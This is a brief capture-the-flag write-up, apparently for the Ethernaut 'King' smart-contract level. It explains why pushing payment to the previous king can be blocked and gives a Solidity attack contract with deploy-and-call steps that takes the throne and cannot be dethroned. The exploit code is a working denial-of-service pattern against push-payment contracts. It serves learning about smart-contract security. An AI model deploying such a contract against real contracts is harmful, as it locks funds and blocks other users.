# King

> When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

The problem with the code is that there is no proper fallback function which could handle the case where the transaction from `king.transfer(msg.value)` fails.

## Solution

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingAttack {
    function attack(address king_) public payable {
        (bool result, ) = king_.call{value: msg.value}("");
        if (!result) revert();
    }
}
```

Contract address: `0x0eF98417eA5EcF7D4CaE409Ff1B1b0E7668be77b`

Deploy this and then call "attack" with 0.1 ETH once that is done. Go back in the console and run 

```js
await contract._king()
```

Our contract will be the king.